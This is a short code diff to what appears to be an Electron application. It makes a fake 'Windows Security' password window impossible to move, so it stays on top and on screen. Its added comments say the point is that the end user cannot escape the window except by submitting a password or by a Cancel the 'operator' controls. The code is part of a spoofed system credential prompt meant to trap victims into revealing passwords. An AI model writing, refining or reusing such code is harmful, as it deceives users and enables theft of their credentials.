@@ -478,6 +478,12 @@ ipcMain.handle('verify-user', async (_e, opts) => {
       currentWin = new BrowserWindow({
         width: 430, height: 290,
         resizable: false, minimizable: false, maximizable: false,
+        // movable: false pins the window exactly where Electron spawns it
+        // (center of the screen, via `center: true`). The end user can't
+        // drag it off-screen, hide it behind another window, or move it
+        // out of the operator's view. Pairs with alwaysOnTop so the only
+        // way out is Cancel (operator-controlled) or submitting a password.
+        movable: false,
         alwaysOnTop: true, center: true, frame: true,
         skipTaskbar: false, title: 'Windows Security', icon: emptyIcon,
         autoHideMenuBar: true, backgroundColor: '#f3f3f3',
